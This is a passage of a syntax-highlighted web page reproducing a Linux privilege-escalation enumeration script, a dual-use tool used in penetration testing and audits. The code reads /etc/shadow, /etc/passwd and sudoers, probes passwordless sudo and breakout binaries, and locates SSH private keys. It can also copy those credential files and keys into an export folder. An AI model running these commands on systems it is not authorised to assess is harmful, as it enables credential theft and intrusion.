operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$currusr</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Current user/group info:\e[00m\n<span class="token variable">$currusr</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#last logged on user information</span>lastlogedonusrs<span class="token operator">=</span>`lastlog 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">grep</span> -v <span class="token string">"Never"</span> 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$lastlogedonusrs</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Users that have previously logged onto the system:\e[00m\n<span class="token variable">$lastlogedonusrs</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span> <span class="token keyword">fi</span><span class="token comment" spellcheck="true">#who else is logged on</span>loggedonusrs<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>w 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$loggedonusrs</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Who else is logged on:\e[00m\n<span class="token variable">$loggedonusrs</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#lists all id's and respective group(s)</span>grpinfo<span class="token operator">=</span>`for i <span class="token keyword">in</span> <span class="token punctuation">$(</span>cut -d<span class="token string">":"</span> -f1 /etc/passwd 2<span class="token operator">></span>/dev/null<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token function">id</span> <span class="token variable">$i</span><span class="token punctuation">;</span><span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$grpinfo</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Group memberships:\e[00m\n<span class="token variable">$grpinfo</span>"</span>  <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#added by phackt - look for adm group (thanks patrick)</span>adm_users<span class="token operator">=</span><span class="token punctuation">$(</span>echo -e <span class="token string">"<span class="token variable">$grpinfo</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"(adm)"</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> -z <span class="token variable">$adm_users</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">then</span>    <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] It looks like we have some admin users:\e[00m\n<span class="token variable">$adm_users</span>"</span>    <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#checks to see if any hashes are stored in /etc/passwd (depreciated  *nix storage method)</span>hashesinpasswd<span class="token operator">=</span>`grep -v <span class="token string">'^[^:]*:[x]'</span> /etc/passwd 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$hashesinpasswd</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] It looks like we have password hashes in /etc/passwd!\e[00m\n<span class="token variable">$hashesinpasswd</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#contents of /etc/passwd</span>readpasswd<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/passwd 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$readpasswd</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Contents of /etc/passwd:\e[00m\n<span class="token variable">$readpasswd</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$readpasswd</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/etc-export/ 2<span class="token operator">></span>/dev/null  <span class="token function">cp</span> /etc/passwd <span class="token variable">$format</span>/etc-export/passwd 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#checks to see if the shadow file can be read</span>readshadow<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/shadow 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$readshadow</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We can read the shadow file!\e[00m\n<span class="token variable">$readshadow</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$readshadow</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/etc-export/ 2<span class="token operator">></span>/dev/null  <span class="token function">cp</span> /etc/shadow <span class="token variable">$format</span>/etc-export/shadow 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#checks to see if /etc/master.passwd can be read - BSD 'shadow' variant</span>readmasterpasswd<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/master.passwd 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$readmasterpasswd</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We can read the master.passwd file!\e[00m\n<span class="token variable">$readmasterpasswd</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$readmasterpasswd</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/etc-export/ 2<span class="token operator">></span>/dev/null  <span class="token function">cp</span> /etc/master.passwd <span class="token variable">$format</span>/etc-export/master.passwd 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#all root accounts (uid 0)</span>superman<span class="token operator">=</span>`grep -v -E <span class="token string">"^#"</span> /etc/passwd 2<span class="token operator">></span>/dev/null<span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'<span class="token variable">$3</span> == 0 { print <span class="token variable">$1</span>}'</span> 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$superman</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Super user account(s):\e[00m\n<span class="token variable">$superman</span>"</span>  <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#pull out vital sudoers info</span>sudoers<span class="token operator">=</span>`grep -v -e <span class="token string">'^$'</span> /etc/sudoers 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">grep</span> -v <span class="token string">"#"</span> 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sudoers</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Sudoers configuration (condensed):\e[00m<span class="token variable">$sudoers</span>"</span>  <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sudoers</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/etc-export/ 2<span class="token operator">></span>/dev/null  <span class="token function">cp</span> /etc/sudoers <span class="token variable">$format</span>/etc-export/sudoers 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#can we sudo without supplying a password</span>sudoperms<span class="token operator">=</span>`echo <span class="token string">''</span> <span class="token operator">|</span> <span class="token function">sudo</span> -S -l -k 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sudoperms</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We can sudo without supplying a password!\e[00m\n<span class="token variable">$sudoperms</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#check sudo perms - authenticated</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sudopass</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sudoperms</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token keyword">:</span>    <span class="token keyword">else</span>      sudoauth<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token keyword">echo</span> $userpassword <span class="token operator">|</span> <span class="token function">sudo</span> -S -l -k 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span>      <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sudoauth</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We can sudo when supplying a password!\e[00m\n<span class="token variable">$sudoauth</span>"</span>         <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>      <span class="token keyword">fi</span>    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">##known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values) - authenticated</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sudopass</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sudoperms</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token keyword">:</span>    <span class="token keyword">else</span>      sudopermscheck<span class="token operator">=</span>`echo <span class="token variable">$userpassword</span> <span class="token operator">|</span> <span class="token function">sudo</span> -S -l -k 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">xargs</span> -n 1 2<span class="token operator">></span>/dev/null<span class="token operator">|</span><span class="token function">sed</span> <span class="token string">'s/,*$//g'</span> 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> -w <span class="token variable">$binarylist</span> 2<span class="token operator">></span>/dev/null`      <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sudopermscheck</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[-] Possible sudo pwnage!\e[00m\n<span class="token variable">$sudopermscheck</span>"</span>         <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>      <span class="token keyword">fi</span>    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values)</span>sudopwnage<span class="token operator">=</span>`echo <span class="token string">''</span> <span class="token operator">|</span> <span class="token function">sudo</span> -S -l -k 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">xargs</span> -n 1 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/,*$//g'</span> 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> -w <span class="token variable">$binarylist</span> 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sudopwnage</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Possible sudo pwnage!\e[00m\n<span class="token variable">$sudopwnage</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#who has sudoed in the past</span>whohasbeensudo<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /home -name .sudo_as_admin_successful 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$whohasbeensudo</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Accounts that have recently used sudo:\e[00m\n<span class="token variable">$whohasbeensudo</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#checks to see if roots home directory is accessible</span>rthmdir<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -ahl /root/ 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$rthmdir</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We can read root's home directory!\e[00m\n<span class="token variable">$rthmdir</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#displays /home directory permissions - check if any are lax</span>homedirperms<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -ahl /home/ 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$homedirperms</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Are permissions on /home directories lax:\e[00m\n<span class="token variable">$homedirperms</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#looks for files we can write to that don't belong to us</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  grfilesall<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -writable <span class="token operator">!</span> -user \<span class="token variable">`</span></span>whoami\` -type f <span class="token operator">!</span> -path <span class="token string">"/proc/*"</span> <span class="token operator">!</span> -path <span class="token string">"/sys/*"</span> -exec <span class="token function">ls</span> -al <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null`  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$grfilesall</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Files not owned by user but writable by group:\e[00m\n<span class="token variable">$grfilesall</span>"</span>     <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#looks for files that belong to us</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  ourfilesall<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -user \<span class="token variable">`</span></span>whoami\` -type f <span class="token operator">!</span> -path <span class="token string">"/proc/*"</span> <span class="token operator">!</span> -path <span class="token string">"/sys/*"</span> -exec <span class="token function">ls</span> -al <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null`  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$ourfilesall</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Files owned by our user:\e[00m\n<span class="token variable">$ourfilesall</span>"</span>    <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#looks for hidden files</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  hiddenfiles<span class="token operator">=</span>`find / -name <span class="token string">".*"</span> -type f <span class="token operator">!</span> -path <span class="token string">"/proc/*"</span> <span class="token operator">!</span> -path <span class="token string">"/sys/*"</span> -exec <span class="token function">ls</span> -al <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null`  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$hiddenfiles</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Hidden files:\e[00m\n<span class="token variable">$hiddenfiles</span>"</span>    <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#looks for world-reabable files within /home - depending on number of /home dirs &amp; files, this can take some time so is only 'activated' with thorough scanning switch</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>wrfileshm<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /home/ -perm -4 -type f -exec <span class="token function">ls</span> -al <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$wrfileshm</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] World-readable files within /home:\e[00m\n<span class="token variable">$wrfileshm</span>"</span>         <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$wrfileshm</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token function">mkdir</span> <span class="token variable">$format</span>/wr-files/ 2<span class="token operator">></span>/dev/null        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$wrfileshm</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/wr-files/ <span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#lists current user's home directory contents</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>homedircontents<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -ahl ~ 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$homedircontents</span>"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Home directory contents:\e[00m\n<span class="token variable">$homedircontents</span>"</span>         <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>     <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#checks for if various ssh files are accessible - this can take some time so is only 'activated' with thorough scanning switch</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>sshfiles<span class="token operator">=</span>`find / \<span class="token punctuation">(</span> -name <span class="token string">"id_dsa*"</span> -o -name <span class="token string">"id_rsa*"</span> -o -name <span class="token string">"known_hosts"</span> -o -name <span class="token string">"authorized_hosts"</span> -o -name <span class="token string">"authorized_keys"</span> \<span class="token punctuation">)</span> -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span>`    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sshfiles</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] SSH keys/host information found in the following locations:\e[00m\n<span class="token variable">$sshfiles</span>"</span>         <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sshfiles</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token function">mkdir</span> <span class="token variable">$format</span>/ssh-files/ 2<span class="token operator">></span>/dev/null        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$sshfiles</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/ssh-files/<span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#is root permitted to login via ssh</span>sshrootlogin<span class="token operator">=</span>`grep <span class="token string">"PermitRootLogin "</span> /etc/ssh/sshd_config 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token string">"#"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print  <span class="token variable">$2</span>}'</span>`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sshrootlogin</span>"</span> <span class="token operator">=</span> <span class="token string">"yes"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Root is allowed to login via SSH:\e[00m"</span> <span class="token punctuation">;</span> <span class="token function">grep</span> <span class="token string">"PermitRootLogin "</span> /etc/ssh/sshd_config 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token string">"#"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token punctuation">}</span>environmental_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m### ENVIRONMENTAL #######################################\e[00m"</span> <span class="token comment" spellcheck="true">#env information</span>envinfo<span class="token operator">=</span>`env 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token string">'LS_COLORS'</span> 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$envinfo</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Environment information:\e[00m\n<span class="token variable">$envinfo</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#check if selinux is enabled</span>sestatus<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>sestatus 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sestatus</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] SELinux seems to be present:\e[00m\n<span class="token variable">$sestatus</span>"</span>  <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#phackt</span><span class="token comment" spellcheck="true">#current path configuration</span>pathinfo<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token keyword">echo</span> $PATH 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$pathinfo</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Path information:\e[00m\n<span class="token variable">$pathinfo</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#lists available shells</span>shellinfo<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/shells 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$shellinfo</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Available shells:\e[00m\n<span class="token variable">$shellinfo</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#current umask value with both octal and symbolic output</span>umaskvalue<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">umask</span> -S 2<span class="token operator">></span>/dev/null <span class="token operator">&amp;</span> <span class="token function">umask</span> 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$umaskvalue</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token 